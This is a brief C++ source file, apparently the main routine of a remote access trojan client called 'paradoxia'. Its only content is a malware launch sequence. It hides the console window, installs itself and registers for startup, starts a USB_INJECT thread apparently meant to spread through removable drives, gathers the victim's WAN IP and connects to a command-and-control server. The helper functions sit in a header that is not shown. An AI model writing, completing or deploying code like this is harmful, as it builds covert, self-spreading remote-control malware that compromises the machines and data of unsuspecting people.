#include "client.h"

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    paradoxia PX;
    PX.Install();
    PX.startup();
    PX.hThread = CreateThread(NULL, 0, USB_INJECT, NULL, 0, NULL);
    PX.WANIP();
    PX.C2Connect();   
    return 0;
}